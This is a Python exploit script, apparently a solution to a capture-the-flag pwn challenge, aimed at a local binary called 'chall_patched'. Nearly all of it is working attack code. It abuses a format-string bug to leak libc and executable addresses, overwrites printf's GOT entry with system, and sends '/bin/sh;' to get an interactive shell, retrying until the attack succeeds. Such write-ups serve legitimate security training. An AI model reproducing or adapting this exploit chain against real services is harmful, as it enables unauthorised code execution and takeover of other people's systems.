#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time

exe = ptr.ELF("./chall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main(io):
    # io = connect()

    def sla(delim: bytes, data: bytes):
        io.sendlineafter(delim, data)
        return

    def sa(delim: bytes, data: bytes):
        io.sendafter(delim, data)
        return

    def sl(data: bytes):
        io.sendline(data)
        return

    def s(data: bytes):
        io.send(data)
        return

    def ru(delim: bytes, drop: bool = False) -> bytes:
        return io.recvuntil(delim, drop=drop)

    def rl() -> bytes:
        return io.recvline()

    __libc_start_main_impl_offset = unwrap(libc.symbol("__libc_start_main_impl"))
    __stack_chk_fail_got_offset = unwrap(exe.got("__stack_chk_fail"))
    main_offset = unwrap(exe.symbol("main"))

    payload = b"%21065c%9$hn"
    assert len(payload) <= 9 + 8
    payload = payload.ljust(9 + 8, b"A")
    payload += ptr.p16(0x8018)
    s(payload)

    # leak libc and exe
    payload = b"#%41$lx#%25$lx#"
    sl(payload)
    ru(b"#")
    libc.base = int(ru(b"#", drop=True), 16) - (__libc_start_main_impl_offset + 139)
    exe.base = int(ru(b"#", drop=True), 16) - main_offset

    # got overwrite: printf -> system
    printf_got = unwrap(exe.got("printf"))
    system = unwrap(libc.symbol("system"))
    payload = b"A"
    payload += pwn.fmtstr_payload(7, {printf_got: system}, numbwritten=1)
    sl(payload)

    # get a shell
    sl(b"/bin/sh;")

    io.interactive()
    exit()


if __name__ == "__main__":
    while True:
        io = connect()
        try:
            main(io)
        except EOFError:
            io.close()
            # time.sleep(0.2)
            continue
